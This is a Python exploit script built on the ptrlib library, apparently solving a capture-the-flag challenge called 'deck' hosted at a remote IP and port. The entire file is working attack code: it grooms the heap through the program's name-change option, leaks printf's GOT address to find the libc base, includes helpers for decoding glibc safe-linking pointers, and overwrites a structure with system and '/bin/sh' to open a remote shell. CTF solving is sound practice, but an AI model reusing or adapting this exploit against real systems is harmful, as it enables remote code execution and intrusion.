from ptrlib import *

binary = "./deck"
elf = ELF(binary)

"""
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
is_remote=False
"""
libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 62318")
is_remote=True
# """


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def wait_for_attach():
    if not is_remote:
        input('attach?')


def sla(*args):
    r.sendlineafter(*args)


def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def encrypt(val, addr):
    return val ^ (addr >> 12)


def play(suit, number):
    r.recvuntil("3. Change your name")
    sla(">", "1")
    sla(": ", suit)
    sla(": ", number)
    l = r.recvlineafter("card: ")
    return l


def ch_method(method):
    r.recvuntil("3. Change your name")
    sla(">", "2")
    sla(":", method)


def ch_name(name, length=None):
    r.recvuntil("3. Change your name")
    sla(">", "3")
    if length is None:
        sla("Length: ", len(name))
    else:
        sla("Length: ", str(length))
    sla(":", name)


def bye():
    r.recvuntil("3. Change your name")
    sla(">", "4")

puts = elf.plt("puts")
printf_got = elf.got("printf")

sizes = []
#sizes.append(0x10)
for i in range(6):
    sizes.append(0x10 * i)
sizes.append(0x70)
sizes.append(0xf0)
#sizes.append(0x80)
for size in sizes:
    ch_name("A" * size)

ch_method(2)
play(1, 1)

ch_name("A" * 0x10)

wait_for_attach()
print("come on")
ch_name("A" * 0x8)
print("nice")
ch_name("A" * 0x8)
print("cool")

# libc_leak

payload = [
        0xdead, 0xbeef,
        0, 0x21,
        puts, printf_got]
payload = flat(payload, map=p64)[:-1]

ch_name(payload, 0x1f0)

r.recvuntil("3. Change your name")
sla(">", "1")
r.recvlineafter('Challenger:')
res = r.recvline()
sla(": ", 1)
sla(": ", 1)

l = r.recvlineafter("card: ")

printf = libc.symbol("printf")
libc.base = just_u64(res) - printf
print("libc_base:", hex(libc.base))

wait_for_attach()

system = libc.symbol("system")
binsh = next(libc.find("/bin/sh"))
assert(printf is not None)
assert(system is not None)

# overwrite
## free
ch_name(b"A" * 0x250)
payload = [
        0xdead, 0xbeef,
        0, 0x21,
        system, binsh]

payload = flat(payload, map=p64)[:-1]
ch_name(payload, 0x1f0)

r.recvuntil("3. Change your name")
sla(">", "1")

r.sh()
